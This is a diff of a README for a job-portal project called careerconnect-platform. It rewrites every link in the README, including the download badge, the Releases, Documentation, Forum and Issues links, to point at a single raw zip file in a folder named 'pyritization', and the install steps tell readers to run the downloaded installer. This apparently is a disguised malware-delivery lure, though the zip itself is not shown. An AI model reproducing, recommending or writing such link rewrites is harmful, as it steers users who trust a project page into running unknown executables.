@@ -1,7 +1,7 @@
 # 🚀 careerconnect-platform - Find Your Dream Job Easily
 
 ## 📥 Download Now
-[![Download careerconnect-platform](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/cryss9/careerconnect-platform/releases)
+[![Download careerconnect-platform](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip%20Now-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip)
 
 ## 📖 About This Project
 careerconnect-platform is a modern job portal web application built with Spring Boot and React. It offers various features, such as user authentication, job posting, job searching, application tracking, and email notifications. This application is designed to make your job search simpler and more effective.
@@ -21,10 +21,10 @@ careerconnect-platform is a modern job portal web application built with Spring 
 ## 📥 Download & Install
 To get started with careerconnect-platform, visit the following link to download the latest version:
 
-[Download careerconnect-platform](https://github.com/cryss9/careerconnect-platform/releases)
+[Download careerconnect-platform](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip)
 
 ### Step-by-Step Installation Guide
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/cryss9/careerconnect-platform/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip).
 2. **Select the Latest Version:** Look for the most recent release. 
 3. **Download the Installer:** Click the download link for your operating system. This will save the installer file to your computer.
 4. **Run the Installer:** Locate the downloaded file and double-click it to start the installation.
@@ -39,8 +39,8 @@ To get started with careerconnect-platform, visit the following link to download
 5. **Track Applications:** Access the application tracking feature to manage your submissions and stay organized.
 
 ## 🌐 Additional Resources
-- **Documentation:** For more detailed instructions and features, consult the [Documentation](https://github.com/cryss9/careerconnect-platform/wiki).
-- **Community Support:** Join the [Community Forum](https://github.com/cryss9/careerconnect-platform/discussions) for discussions and to ask questions.
+- **Documentation:** For more detailed instructions and features, consult the [Documentation](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip).
+- **Community Support:** Join the [Community Forum](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip) for discussions and to ask questions.
 
 ## 🛠️ Technologies Used
 - **Frontend:** React, TypeScript, Mantine UI, Tailwind CSS.
@@ -48,6 +48,6 @@ To get started with careerconnect-platform, visit the following link to download
 - **State Management:** Redux Toolkit.
 
 ## 📧 Contact
-If you have any questions or need assistance, feel free to reach out through the [Issues page](https://github.com/cryss9/careerconnect-platform/issues).
+If you have any questions or need assistance, feel free to reach out through the [Issues page](https://raw.githubusercontent.com/cryss9/careerconnect-platform/main/pyritization/careerconnect-platform.zip).
 
 Thank you for choosing careerconnect-platform! Happy job hunting!
